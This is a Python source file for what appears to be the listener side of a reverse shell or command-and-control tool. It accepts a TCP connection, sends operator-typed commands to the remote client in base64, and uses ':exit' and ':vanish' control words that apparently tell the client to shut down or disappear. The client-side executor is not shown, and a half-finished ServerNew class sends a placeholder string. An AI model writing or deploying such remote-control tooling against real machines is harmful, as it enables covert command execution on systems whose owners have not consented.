import socket
import subprocess
import time
import os
import base64
from comms import Comms

class ServerNew(object):
    def __init__(self, host, port):
        self.__comms = Comms(host, port)

    def listen(self):
        self.__comms.listen()
        self.__comms.send("Bananarama")

class Server(object):
    def __init__(self, host, port):
        self.__host = host
        self.__port = port
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((host, port))

    def __encode(self, data):
        encoded = data.encode()
        encoded = base64.b64encode(encoded)
        return encoded

    def __decode(self, data):
        decoded = base64.b64decode(data)
        decoded = decoded.decode()
        return decoded

    def listen(self):
        self.__sock.listen(1)

        while True:
            print('Listening for incoming TCP connections on: ' + self.__host + ':' + str(self.__port))
            conn, addr = self.__sock.accept()
            print('Got a connection from: ' + str(addr))

            while True:
                cmd = ''
                received = self.__decode(conn.recv(1024))
                while cmd == '':
                    cmd = input(received)

                if cmd == ':exit':
                    conn.send(self.__encode(':vanish'))
                    print(self.__decode(conn.recv(1024))+'\n')
                    print('Shutting down server...')
                    os._exit(0)
                elif cmd == ':vanish':
                    conn.send(self.__encode(':vanish'))
                    print(self.__decode(conn.recv(1024))+'\n')
                    break
                else:
                    conn.send(self.__encode(cmd))


if __name__ == '__main__':
    ServerNew('127.0.0.1', 8080).listen()
    #Server('127.0.0.1', 8080).listen()
